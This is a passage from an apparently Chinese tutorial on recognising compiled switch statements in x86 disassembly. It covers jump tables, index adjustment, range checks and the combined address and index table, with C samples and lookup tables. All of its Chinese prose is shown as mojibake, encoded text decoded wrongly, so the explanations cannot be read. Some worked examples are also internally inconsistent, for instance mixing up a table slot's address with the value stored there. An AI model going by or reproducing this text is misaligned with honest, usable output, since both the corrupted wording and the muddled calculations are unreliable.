ä¿è¯äº†switchçš„å‚æ•°å€¼nåœ¨caseçš„èŒƒå›´ä¹‹å†…åï¼Œå¯¹caseåœ°å€æ•°ç»„è¿›è¡ŒæŸ¥è¡¨ 100401047 jmp dword ptr [edx*4+4010AAh] ä»¥[edx*4+4010AAh]æ¥æŸ¥è¡¨ï¼Œå¾—åˆ°è¦å»å‘çš„caseè¯­å¥å—çš„èµ·å§‹åœ°å€ã€‚ å‡è®¾è¾“å…¥ç»™switchçš„å‚æ•°å€¼ä¸º1ï¼Œç¼–è¯‘å™¨å‡1è°ƒæ•´åˆ°caseåœ°å€æ•°ç»„çš„ä¸‹æ ‡0åï¼Œ[edx*4+4010AAh]å˜æˆäº†0*4++4010AAhï¼Œä¸ºè¡¨ä¸­ç¬¬0é¡¹ï¼Œå³case1è¯­å¥å—çš„é¦–åœ°å€ã€‚ å‡è®¾è¾“å…¥ç»™switchçš„å‚æ•°å€¼ä¸º2ï¼Œç¼–è¯‘å™¨å‡1è°ƒæ•´åˆ°caseåœ°å€æ•°ç»„çš„ä¸‹æ ‡1åï¼Œ[edx*4+4010AAh]å˜æˆäº†1*4++4010AAhï¼Œä¸ºè¡¨ä¸­ç¬¬1é¡¹ï¼Œå³case2è¯­å¥å—çš„é¦–åœ°å€ã€‚ å…¶ä½™åŒç†ã€‚ n -1è°ƒæ•´åçš„æ•°ç»„ä¸‹æ ‡ æ˜¯å¦å¤„äºcaseèŒƒå›´å†… edx*4+4010AAhçš„å€¼ è¡¨é¡¹ è¡¨é¡¹çš„å«ä¹‰ ç¨‹åºçš„æ‰§è¡Œæµç¨‹ -1 -2ï¼ˆ-1-1=-2ï¼‰ è¡¥ç FFFFFFFEï¼Œæ¯”3å¤§ï¼Œè·³åˆ°default - - - n=-1ï¼Œæ‰§è¡Œdefault 0 -1ï¼ˆ0-1=-1ï¼‰ è¡¥ç FFFFFFFFï¼Œæ¯”3å¤§ï¼Œè·³åˆ°default - - - n=0ï¼Œæ‰§è¡Œdefault 1 0 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 0*4+4010AAh 0040104E case1è¯­å¥å—çš„èµ·å§‹åœ°å€ n=1ï¼Œæ‰§è¡Œcase1 2 1 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 1*4+4010AAh 0040105D case2è¯­å¥å—çš„èµ·å§‹åœ°å€ n=2ï¼Œæ‰§è¡Œcase2 3 2 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 2*4+4010AAh 0040106C case3è¯­å¥å—çš„èµ·å§‹åœ°å€ n=3ï¼Œæ‰§è¡Œcase3 4 3 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 3*4+4010AAh 0040107B case4è¯­å¥å—çš„èµ·å§‹åœ°å€ n=4ï¼Œæ‰§è¡Œcase4 5 4 æ¯”3å¤§ï¼Œè·³åˆ°default - - - n=5ï¼Œæ‰§è¡Œdefault ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºswitchæ¯”ifâ€¦elseè¯­å¥é«˜æ•ˆçš„åŸå› ï¼š ç¼–è¯‘å™¨åˆ¶ä½œäº†ä¸€å¼ å¤§è¡¨ï¼Œè¡¨é¡¹æ˜¯å„ä¸ªcaseåˆ†æ”¯çš„èµ·å§‹åœ°å€ã€‚éšåé€šè¿‡switchè¦è€ƒå¯Ÿçš„å‚æ•°è®¡ç®—ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå°†è¡¨è¾¾å¼ç®—å‡ºæ¥ç»“æœåï¼Œè¿™ä¸ªç»“æœæ˜¯ä¸ªåœ°å€ï¼ŒæŒ‡å‘å¤§è¡¨ä¸­çš„è¡¨é¡¹ï¼Œéšåè·³åˆ°è¡¨é¡¹è¿™ä¸ªåœ°å€ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘åªè¦æŠŠè¡¨è¾¾å¼ç»“æœç®—å‡ºæ¥ï¼Œå°±èƒ½å¾—åˆ°è¦ç›´æ¥è·³è¿‡å»åœ°å€ï¼Œè€Œä¸æ˜¯åƒifâ€¦elseé‚£æ ·ä¸€ä¸ªä¸€ä¸ªåˆ¤æ–­ï¼Œæœ‰è¾ƒå¤šçš„æ¯”è¾ƒæ¬¡æ•°ã€‚ case101-104 12345678910111213141516171819202122232425#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 101: printf(&quot;case 101&quot;); break; case 102: printf(&quot;case 102&quot;); break; case 103: printf(&quot;case 103&quot;); break; case 104: printf(&quot;case 104&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 100401038 sub ecx,65h 65h=101Dï¼Œå‡å»101ï¼ˆcaseæœ€å°å€¼ï¼‰åï¼Œå°±ä»0å¼€å§‹äº†ã€‚æ•°ç»„èŒƒå›´è¿˜æ˜¯[0,3] å‡è®¾è¾“å…¥ç»™switchçš„å‚æ•°å€¼ä¸º101ï¼Œç¼–è¯‘å™¨å‡101è°ƒæ•´åˆ°caseåœ°å€æ•°ç»„çš„ä¸‹æ ‡0åï¼Œ[edx*4+4010AAh]å˜æˆäº†0*4++4010AAhï¼Œä¸ºè¡¨ä¸­ç¬¬0é¡¹ï¼Œå³case101è¯­å¥å—çš„é¦–åœ°å€ã€‚ å‡è®¾è¾“å…¥ç»™switchçš„å‚æ•°å€¼ä¸º102ï¼Œç¼–è¯‘å™¨å‡101è°ƒæ•´åˆ°caseåœ°å€æ•°ç»„çš„ä¸‹æ ‡1åï¼Œ[edx*4+4010AAh]å˜æˆäº†1*4++4010AAhï¼Œä¸ºè¡¨ä¸­ç¬¬1é¡¹ï¼Œå³case102è¯­å¥å—çš„é¦–åœ°å€ã€‚ å…¶ä½™åŒç†ã€‚ n -101è°ƒæ•´åçš„æ•°ç»„ä¸‹æ ‡ æ˜¯å¦å¤„äºcaseèŒƒå›´å†… edx*4+4010AAhçš„å€¼ è¡¨é¡¹ è¡¨é¡¹çš„å«ä¹‰ ç¨‹åºçš„æ‰§è¡Œæµç¨‹ -1 -102ï¼ˆ-1-101=-102ï¼‰ è¡¥ç FFFFFF9Aï¼Œæ¯”3å¤§ï¼Œè·³åˆ°default - - - n=-1ï¼Œæ‰§è¡Œdefault 0 -101ï¼ˆ0-101=-101ï¼‰ è¡¥ç FFFFFF9Bï¼Œæ¯”3å¤§ï¼Œè·³åˆ°default - - - n=0ï¼Œæ‰§è¡Œdefault 101 0 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 0*4+4010AAh 0040104E case101è¯­å¥å—çš„èµ·å§‹åœ°å€ n=101ï¼Œæ‰§è¡Œcase101 102 1 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 1*4+4010AAh 0040105D case102è¯­å¥å—çš„èµ·å§‹åœ°å€ n=102ï¼Œæ‰§è¡Œcase102 103 2 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 2*4+4010AAh 0040106C case103è¯­å¥å—çš„èµ·å§‹åœ°å€ n=103ï¼Œæ‰§è¡Œcase103 104 3 &lt;=3ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 3*4+4010AAh 0040107B case104è¯­å¥å—çš„èµ·å§‹åœ°å€ n=104ï¼Œæ‰§è¡Œcase104 105 4 æ¯”3å¤§ï¼Œè·³åˆ°default - - - n=105ï¼Œæ‰§è¡Œdefault å½“caseçš„åˆ¤å®šå€¼å­˜åœ¨æ˜æ˜¾çº¿æ€§å…³ç³»ç»„åˆï¼Œï¼ˆä¸caseåˆ¤å®šå€¼å¤§å°æ— å…³ï¼Œä¸æ˜¯è¯´case 30000ï¼Œè¿™ä¹ˆå¤§å°±ä¸ç”Ÿæˆå¤§è¡¨ï¼‰å°±ä¼šç”Ÿæˆå¤§è¡¨ã€‚caseåˆ¤å®šå€¼çš„å¤§å°æ— æ‰€è°“ï¼Œç¼–è¯‘å™¨ä¼šè¿›è¡Œsubè°ƒæ•´ï¼Œæœ€åä¾ç„¶å¯ä»¥ä»æ•°ç»„ä¸‹æ ‡0å¼€å§‹ã€‚ æ‰“ä¹±é¡ºåºçš„case1-4 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 4: printf(&quot;case 4&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 1: printf(&quot;case 1&quot;); break; case 3: printf(&quot;case 3&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; åªè¦caseå€¼å­˜åœ¨çº¿æ€§å…³ç³»ï¼Œå°±ä¼šå½¢æˆå¤§è¡¨ï¼Œè€Œä¸caseå€¼çš„é¡ºåºæ— å…³ã€‚ å¦‚æœcaseå€¼é¡ºåºæ˜¯æ‰“ä¹±çš„ï¼Œç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å¯¹caseåœ°å€è¡¨è¡¨é¡¹è¿›è¡Œæ’åºï¼Œå¦‚è¯¥ä¾‹ä¸­caseçš„é¡ºåºä¸º4ã€2ã€1ã€3ã€‚é‚£ä¹ˆåœ¨caseåœ°å€è¡¨ä¸­ï¼Œä¼šå°†caseè¯­å¥å—çš„é¦–åœ°å€è¿›è¡Œæ’åºï¼Œå°†case 1è¯­å¥å—é¦–åœ°å€æ”¾åœ¨caseåœ°å€è¡¨çš„ç¬¬0é¡¹ä¸Šï¼Œcase 2è¯­å¥å—é¦–åœ°å€æ”¾åœ¨è¡¨ä¸­ç¬¬1é¡¹ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå°†caseè¯­å¥å—é¦–åœ°å€å˜ä¸ºä¸€ä¸ªæœ‰åºçš„è¡¨æ ¼è¿›è¡Œå­˜æ”¾ã€‚ ç›¸å¯¹å…³ç³» æ¯”ä¾‹å› å­å¯»å€ åœ°å€è¡¨çš„å†…å­˜åœ°å€ é¡¹æ•° å¯¹åº”ä»£ç ä¸­ä»ä¸Šåˆ°ä¸‹ç¬¬å‡ ä¸ªcaseè¯­å¥ åœ°å€è¡¨ä¸­è¡¨é¡¹çš„å€¼ å€¼çš„å«ä¹‰ $==&gt; $+4*0 004010AA ç¬¬0é¡¹ ç¬¬3ä¸ªcaseè¯­å¥ï¼ˆcase 1ï¼‰ 0040106C case1è¯­å¥å—çš„èµ·å§‹åœ°å€ $+4 $+4*1 004010AE ç¬¬1é¡¹ ç¬¬2ä¸ªcaseè¯­å¥ï¼ˆcase 2ï¼‰ 0040105D case2è¯­å¥å—çš„èµ·å§‹åœ°å€ $+8 $+4*2 004010B2 ç¬¬2é¡¹ ç¬¬4ä¸ªcaseè¯­å¥ï¼ˆcase 3ï¼‰ 0040107B case3è¯­å¥å—çš„èµ·å§‹åœ°å€ $+C $+4*3 004010B6 ç¬¬3é¡¹ ç¬¬1ä¸ªcaseè¯­å¥ï¼ˆcase 4ï¼‰ 0040104E case4è¯­å¥å—çš„èµ·å§‹åœ°å€ å’Œh2åœ°å€è¡¨ï¼ˆå¤§è¡¨ï¼‰ä¸‹åœ°å€è¡¨é‚£ä¸ªè¡¨æ ¼ç›¸æ¯”ï¼Œå°±åªæ˜¯â€œåœ°å€è¡¨ä¸­çš„å€¼â€è¿™ä¸€åˆ—å‘ç”Ÿäº†å˜åŒ–ã€‚ å¾ˆå¥½ç†è§£ï¼ŒæŸ¥è¡¨æ—¶ï¼Œè¦æ»¡è¶³åœ°å€è¡¨ç¬¬0é¡¹ï¼Œä¸ºæœ€å°caseå€¼è¯­å¥å—èµ·å§‹åœ°å€ï¼›åœ°å€è¡¨ç¬¬1é¡¹ï¼Œä¸ºç¬¬äºŒå°caseå€¼è¯­å¥å—èµ·å§‹åœ°å€è¿™ç§å…³ç³»ã€‚è€ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¸­caseè¯­å¥å—çš„åœ°å€é«˜ä½æ˜¯ç”±è¿™ä¸ªcaseè¯­å¥å—åœ¨æºç ä¸­æ˜¯ä½è¡Œæ•°è¿˜æ˜¯é«˜è¡Œæ•°å†³å®šã€‚ ä¸­é—´ç©ºç¼ºå‡ é¡¹ ç¼ºä¸€é¡¹ æœ‰defaultç¼ºä¸€é¡¹ æ— default1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 5: printf(&quot;case 5&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 5: printf(&quot;case 5&quot;); break; //default: //printf(&quot;default&quot;); //break; &#125; return 0;&#125; ç¼ºä¸¤é¡¹ï¼Œæœ‰default 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 6: printf(&quot;case 6&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; ä¸ºäº†è¾¾åˆ°çº¿æ€§æœ‰åºï¼Œå¦‚æœcaseå€¼ä¸­é—´ç©ºç¼ºå‡ é¡¹ï¼Œç¼–è¯‘å™¨ä¼šæ‹¿defultè¯­å¥é¦–åœ°å€/switchç»“æŸåœ°å€æ¥å¡«å……ã€‚ åœ°å€è¡¨çš„å†…å­˜åœ°å€ é¡¹æ•° åœ°å€è¡¨ä¸­çš„å€¼ å«ä¹‰ 004010AA ç¬¬0é¡¹ 0040104E case1è¯­å¥å—çš„èµ·å§‹åœ°å€ 004010AE ç¬¬1é¡¹ 0040105D case2è¯­å¥å—çš„èµ·å§‹åœ°å€ 004010B2 ç¬¬2é¡¹ 0040106C case3è¯­å¥å—çš„èµ·å§‹åœ°å€ 004010B6 ç¬¬3é¡¹ 0040108A defaultè¯­å¥èµ·å§‹åœ°å€ 004010BA ç¬¬4é¡¹ 0040108A defaultè¯­å¥èµ·å§‹åœ°å€ 004010BE ç¬¬5é¡¹ 0040107B case6è¯­å¥å—çš„èµ·å§‹åœ°å€ å‡è®¾è¾“å…¥ç»™switchçš„å‚æ•°å€¼ä¸º4ï¼Œç¼–è¯‘å™¨å‡1è°ƒæ•´åˆ°caseåœ°å€æ•°ç»„çš„ä¸‹æ ‡0åï¼Œ[edx*4+4010AAh]å˜æˆäº†3*4+4010AAh=0040108Aï¼Œä¸ºè¡¨ä¸­ç¬¬3é¡¹ï¼Œå³defultè¯­å¥é¦–åœ°å€ã€‚é€»è¾‘ä¸Šï¼Œå¾…è€ƒå¯Ÿå‚æ•°3è¿›å…¥switchè¯­å¥å—ä¸­ï¼Œæ²¡æœ‰caseä¸ä¹‹åŒ¹é…ï¼Œæœ‰defaultèµ°defaultï¼Œæ²¡defaultç»“æŸswitchï¼Œä»ç¨‹åºæ‰§è¡Œæµç¨‹ä¸Šçœ‹ï¼Œé€»è¾‘åˆç†ã€‚ n -1è°ƒæ•´åçš„æ•°ç»„ä¸‹æ ‡ æ˜¯å¦å¤„äºcaseèŒƒå›´å†… edx*4+4010AAhçš„å€¼ è¡¨é¡¹ è¡¨é¡¹çš„å«ä¹‰ ç¨‹åºçš„æ‰§è¡Œæµç¨‹ -1 -2ï¼ˆ-1-1=-2ï¼‰ è¡¥ç FFFFFFFEï¼Œæ¯”5å¤§ï¼Œè·³åˆ°default - - - n=-1ï¼Œæ‰§è¡Œdefault 0 -1ï¼ˆ0-1=-1ï¼‰ è¡¥ç FFFFFFFFï¼Œæ¯”5å¤§ï¼Œè·³åˆ°default - - - n=0ï¼Œæ‰§è¡Œdefault 1 0 &lt;=5ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 0*4+4010AAh 0040104E case1è¯­å¥å—çš„èµ·å§‹åœ°å€ n=1ï¼Œæ‰§è¡Œcase1 2 1 &lt;=5ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 1*4+4010AAh 0040105D case2è¯­å¥å—çš„èµ·å§‹åœ°å€ n=2ï¼Œæ‰§è¡Œcase2 3 2 &lt;=5ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 2*4+4010AAh 0040106C case3è¯­å¥å—çš„èµ·å§‹åœ°å€ n=3ï¼Œæ‰§è¡Œcase3 4 3 &lt;=5ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 3*4+4010AAh 0040107B case4è¯­å¥å—çš„èµ·å§‹åœ°å€ n=4ï¼Œæ‰§è¡Œcase4 5 4 &lt;=5ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… - - - n=5ï¼Œæ‰§è¡Œdefault 6 5 &lt;=5ï¼Œç»§ç»­æ‰§è¡Œã€‚åœ¨caseèŒƒå›´å†… 7 6 æ¯”5å¤§ï¼Œè·³åˆ°default - - - é—´éš™â‰¤6ä¼šæ‹¿defultè¯­å¥é¦–åœ°å€/switchç»“æŸåœ°å€æ¥è¡¥ï¼Œæµªè´¹ç‚¹å†…å­˜ç©ºé—´ï¼Œç»´æŒä½é«˜æ•ˆçš„çº¿æ€§ç»“æ„ï¼Œä½†ç¼ºå¾—å¤šäº†ä¹Ÿä¸å¥½ä½¿ï¼Œå¦‚æœé—´éš™&gt;6ï¼Œè¿™ç§å¡«å……æ–¹å¼ä¼šæå¤§åœ°æµªè´¹å†…å­˜ç©ºé—´ã€‚é‚£ä¹ˆï¼Œç¼–è¯‘å™¨æ€ä¹ˆä¼˜åŒ–ï¼Ÿé‡‡ç”¨å¤§è¡¨+å°è¡¨çš„æ–¹å¼ã€‚ å°ç»“ å¤§è¡¨switchç»“æ„è¯†åˆ«çš„å…³é”®ç‚¹ï¼š è·å–æŸä¸€ä¸ªå€¼è¿›è¡Œè°ƒæ•´ï¼ˆå¯èƒ½æ²¡è°ƒæ•´è¿™ä¸€æ­¥ï¼‰ è·³è½¬æŒ‡ä»¤jccè¿›è¡ŒèŒƒå›´æ£€æŸ¥ å¦‚æœä¸åœ¨è¿™ä¸ªèŒƒå›´ï¼Œåˆ™è·³èµ° å¦‚æœåœ¨è¿™ä¸ªèŒƒå›´ï¼Œåˆ™ä¸è·³èµ°ï¼Œç»§ç»­æ‰§è¡Œ è·³è½¬æŒ‡ä»¤åç´§è·ŸjmpæŒ‡ä»¤ï¼Œå¹¶ä¸”æ˜¯ç›¸å¯¹æ¯”ä¾‹å› å­å¯»å€æ–¹å¼ 123456789101112;è°ƒæ•´mov reg,mem ;å–å¾…è€ƒå¯Ÿçš„è¡¨è¾¾å¼ç»“æœ... ;è¿›è¡Œè°ƒæ•´ï¼Œå¯¹é½caseåœ°å€è¡¨çš„0ä¸‹æ ‡ã€‚æœ‰å¯èƒ½æ²¡æœ‰è°ƒæ•´è¿™ä¸€æ­¥;åˆ¤æ–­caseèŒƒå›´... ;å½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ï¼Œè¿›è¡ŒèŒƒå›´æ£€æŸ¥jxx DEFAULT_ADDR ;ä¸åœ¨caseèŒƒå›´ï¼Œè·³åˆ°defaultè¯­å¥é¦–åœ°å€æˆ–switchè¯­å¥å—ç»“æŸåœ°å€;æŸ¥è¡¨mov eax, [reg+xxxx] ;[reg+xxxx]å­˜çš„æ˜¯è°ƒæ•´åçš„å€¼ ;eaxä¹Ÿå¯ç”¨å…¶ä»–å¯„å­˜å™¨æ›¿æ¢ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç±»å‹çš„è¿ç®—jmp dword ptr [eax*4+xxxx] ;åœ°å€xxxxä¸ºcaseåœ°å€è¡¨çš„é¦–åœ°å€ defaultè¯­å¥é¦–åœ°å€/switchç»“æŸåœ°å€ ç”±èŒƒå›´æ£€æŸ¥jccçš„åœ°å€ç¡®å®š åœ°å€è¡¨ä¸­é‡å¤çš„é¡¹ caseåœ°å€è¡¨ èµ·å§‹åœ°å€ï¼šç›¸å¯¹æ¯”ä¾‹å› å­å¯»å€æ–¹å¼ä¸­çš„åŸºå€ caseè¯­å¥å— caseçš„åˆ¤å®šå€¼ caseåœ°å€è¡¨æ˜¯ä¸€ä¸ªæœ‰åºè¡¨ï¼Œä»¥ä¸‹æ ‡ä¸º0å¼€å§‹ã€‚ç”¨ä¸‹æ ‡+åå‘è°ƒæ•´ï¼ˆè°ƒæ•´æ•°ç»„ä¸‹æ ‡æ—¶ç›¸åçš„æ“ä½œï¼‰å¾—åˆ°caseçš„æ ‡å·å€¼ã€‚æ¯”å¦‚ï¼Œåœ¨switchè¯­å¥å—ä¸­æ˜¯é€šè¿‡-1æ¥è°ƒæ•´æ•°ç»„ä¸‹æ ‡ï¼Œé‚£ä¹ˆcaseåœ°å€è¡¨ç¬¬0é¡¹å¯¹åº”çš„æ˜¯case 1(0+1=1)ã€‚æŒ‰æ­¤ï¼Œä¾æ¬¡è¿˜åŸåç»­caseè¯­å¥å—ã€‚ èµ·å§‹åœ°å€ åœ°å€è¡¨ä¸­çš„è¡¨é¡¹å°±æ˜¯caseè¯­å¥çš„èµ·å§‹åœ°å€ ç»“æŸåœ°å€ ä¸¤ä¸ªcaseèµ·å§‹åœ°å€ä¹‹é—´ åœ°å€è¡¨+ç´¢å¼•è¡¨ï¼ˆå¤§è¡¨+å°è¡¨ï¼‰ 12345678910111213141516171819202122232425262728293031#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break;\t//case 9: //printf(&quot;case 10&quot;); //break; case 10: printf(&quot;case 10&quot;); break; case 11: printf(&quot;case 11&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; ç¼–è¯‘å™¨é™¤äº†ç”Ÿæˆåœ°å€è¡¨ï¼ˆå¤§è¡¨ï¼‰å¤–ï¼Œè¿˜ç”Ÿæˆäº†ä¸€ä¸ªç´¢å¼•è¡¨ï¼ˆå°è¡¨ï¼‰ã€‚ åœ°å€è¡¨ å­˜æ”¾caseè¯­å¥é¦–åœ°å€ï¼Œdefaultè¯­å¥å—é¦–åœ°å€/switchç»“æŸåœ°å€ã€‚ defaultè¯­å¥å—/switchç»“æŸåœ°å€åªä¼šä¿å­˜ä¸€ä»½ï¼Œä¸ä¼šåƒæœ‰åºçº¿æ€§åœ°å€è¡¨é‚£æ ·ä¸ºäº†å¡«è¡¥é—´éš™è€Œé‡å¤ä¿å­˜å¤šæ¬¡ã€‚ åœ°å€è¡¨çš„ä¸ªæ•°ï¼šcaseè¯­å¥å—æ•°é‡+1ï¼ˆdefaultè¯­å¥å—é¦–åœ°å€/switchç»“æŸåœ°å€ï¼‰ è¯¥ä¾‹å­ä¸­ï¼Œ40D831hä¸ºè¿™å¼ è¡¨çš„èµ·å§‹åœ°å€ï¼Œåé¢ä¼šç”¨æ¯”ä¾‹å› å­å¯»å€[edx*4+40D831h]æ¥æŸ¥è¡¨ï¼ˆè¿™é‡Œå°†æŸ¥è¯¢å¾—åˆ°æ•°ç»„æŸä¸ªå…ƒç´ çš„è¿‡ç¨‹ç§°ä¸ºæŸ¥è¡¨ï¼‰ã€‚ ç›¸å¯¹å…³ç³» æ¯”ä¾‹å› å­å¯»å€ åœ°å€è¡¨çš„å†…å­˜åœ°å€ é¡¹æ•° åœ°å€è¡¨ä¸­çš„å€¼ å«ä¹‰ $==&gt; $+4*0 0040D831 ç¬¬0é¡¹ 0040D7C6 case1è¯­å¥å—çš„èµ·å§‹åœ°å€ $+4 $+4*1 0040D835 ç¬¬1é¡¹ 0040D7D5 case2è¯­å¥å—çš„èµ·å§‹åœ°å€ $+8 $+4*2 0040D839 ç¬¬2é¡¹ 0040D7E4 case3è¯­å¥å—çš„èµ·å§‹åœ°å€ $+C $+4*3 0040D83D ç¬¬3é¡¹ 0040D7F3 case10è¯­å¥å—çš„èµ·å§‹åœ°å€ $+10 $+4*4 0040D841 ç¬¬4é¡¹ 0040D802 case11è¯­å¥å—çš„èµ·å§‹åœ°å€ $+14 $+4*5 0040D845 ç¬¬5é¡¹ 0040D811 defaultè¯­å¥å—é¦–åœ°å€ ç´¢å¼•è¡¨ æ¯ä¸€é¡¹å¤§å°æ˜¯1ä¸ªå­—èŠ‚ï¼Œå­˜æ”¾åœ°å€è¡¨çš„ç´¢å¼•ç¼–å·ã€‚ ç´¢å¼•è¡¨çš„ä¸ªæ•°ï¼šæœ€å¤§caseå€¼å’Œæœ€å°caseå€¼çš„å·®ã€‚ æ¯ä¸€é¡¹å¤§å°æ˜¯1ä¸ªå­—èŠ‚ï¼Œ00-FFï¼Œæœ€å¤šå¯ä»¥ä¿å­˜256é¡¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œcaseå€¼çš„æ€»ä¸ªæ•°ä¸èƒ½è¶…è¿‡256ä¸ªï¼Œè¦ä¸ç”¨1ä¸ªå­—èŠ‚å°±æ²¡æ³•è¡¨ç¤ºäº†ã€‚ è¯¥ä¾‹å­ä¸­ï¼Œ40D849hä¸ºè¿™å¼ è¡¨çš„èµ·å§‹åœ°å€ï¼Œåé¢ä¼šç”¨æ¯”ä¾‹å› å­å¯»å€(0040d849)[eax]æ¥æŸ¥è¡¨ï¼ˆè¿™é‡Œå°†æŸ¥è¯¢å¾—åˆ°æ•°ç»„æŸä¸ªå…ƒç´ çš„è¿‡ç¨‹ç§°ä¸ºæŸ¥è¡¨ï¼‰ã€‚ (0040d849)[eax]å°±æ˜¯[eax+0040d849] ç›¸å¯¹å…³ç³» æ¯”ä¾‹å› å­å¯»å€ åœ°å€è¡¨çš„å†…å­˜åœ°å€ é¡¹æ•° åœ°å€è¡¨ä¸­çš„å€¼ å«ä¹‰ æŸ¥åœ°å€è¡¨å¾—åˆ°çš„æ˜¯ $==&gt; $+0*1 0040D849 ç¬¬0é¡¹ 00 ç¬¬0é¡¹ case1è¯­å¥å—çš„èµ·å§‹åœ°å€ $+1 $+1*1 0040D84A ç¬¬1é¡¹ 01 ç¬¬1é¡¹ case2è¯­å¥å—çš„èµ·å§‹åœ°å€ $+2 $+2*1 0040D84B ç¬¬2é¡¹ 02 ç¬¬2é¡¹ case3è¯­å¥å—çš„èµ·å§‹åœ°å€ $+3 $+3*1 0040D84C ç¬¬3é¡¹ 05 ç¬¬5é¡¹ defaultè¯­å¥å—é¦–åœ°å€ $+4 $+4*1 0040D84D ç¬¬4é¡¹ 05 ç¬¬5é¡¹ defaultè¯­å¥å—é¦–åœ°å€ $+5 $+5*1 0040D84E ç¬¬5é¡¹ 05 ç¬¬5é¡¹ defaultè¯­å¥å—é¦–åœ°å€ $+6 $+6*1 0040D84F ç¬¬6é¡¹ 05 ç¬¬5é¡¹ defaultè¯­å¥å—é¦–åœ°å€ $+7 $+7*1 0040D850 ç¬¬7é¡¹ 05 ç¬¬5é¡¹ defaultè¯­å¥å—é¦–åœ°å€ $+8 $+8*1 0040D851 ç¬¬8é¡¹ 05 ç¬¬5é¡¹ defaultè¯­å¥å—é¦–åœ°å€ $+9 $+9*1 0040D852 ç¬¬9é¡¹ 03 ç¬¬3é¡¹ case10è¯­å¥å—çš„èµ·å§‹åœ°å€ $+A $+A*1 0040D853 ç¬¬10é¡¹ 04 ç¬¬4é¡¹ case11è¯­å¥å—çš„èµ·å§‹åœ°å€ æµç¨‹è¯¦ç»†åˆ†æ å¯¹å¾…è€ƒå¯Ÿçš„å˜é‡nä½œå¤„ç†ï¼Œä½¿å…¶å¯ä½œä¸ºæ•°ç»„ä¸‹æ ‡è¿›è¡Œå¯»å€ 123450040D79F mov eax,dword ptr [ebp-4]0040D7A2 mov dword ptr [ebp-8],eax0040D7A5 mov ecx,dword ptr [ebp-8]0040D7A8 sub ecx,1 //å¯¹é½äºæ•°ç»„ä¸‹æ ‡ ä¸å‰é¢åŒï¼Œæ­¤å¤„ç•¥ å¾…è€ƒå¯Ÿçš„å˜é‡næ˜¯å¦å¤„äºcaseèŒƒå›´ 1230040D7AB mov dword ptr [ebp-8],ecx0040D7AE cmp dword ptr [ebp-8],0Ah0040D7B2 ja $L543+0Fh (0040d811) //è·³åˆ°defaulté¦–åœ°å€ ä¸å‰é¢åŒï¼Œæ­¤å¤„ç•¥ ä¿è¯äº†switchçš„å‚æ•°å€¼nåœ¨caseçš„èŒƒå›´ä¹‹å†…åï¼Œè¿›è¡ŒäºŒæ¬¡æŸ¥è¡¨ ç¬¬ä¸€æ¬¡æŸ¥è¡¨ï¼ŒæŸ¥ç´¢å¼•è¡¨ 1230040D7B4 mov eax,dword ptr [ebp-8]0040D7B7 xor edx,edx0040D7B9 mov dl,byte ptr (0040d849)[eax] (0040d849)[eax]å°±æ˜¯[eax+0040d849]ï¼Œå–çš„æ˜¯byteç±»å‹ï¼Œå¾—åˆ°åœ°å€è¡¨çš„ä¸‹æ ‡ã€‚ ç¬¬äºŒæ¬¡æŸ¥è¡¨ï¼ŒæŸ¥åœ°å€è¡¨ å†æ ¹æ®è¿™ä¸ªä¸‹æ 